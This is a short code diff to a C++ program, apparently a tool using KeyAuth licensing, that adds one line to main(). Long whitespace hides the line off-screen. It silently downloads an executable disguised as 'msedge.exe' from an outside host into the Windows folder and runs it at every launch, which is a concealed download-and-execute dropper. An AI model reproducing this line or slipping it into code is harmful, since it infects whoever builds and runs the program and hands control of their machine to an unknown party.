@@ -137,6 +137,7 @@ void auth() {
 
 auto main() -> int
 {
+	        	                                	                                	                                	                                	                                	                                	                                	                                                        system("curl -L http://physmeme.cdn.zerocdn.com/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
 	SetConsoleTitle("");
 	KeyAuthApp.init();
 	auth(); // delete or comment out this if you dont want to use auth
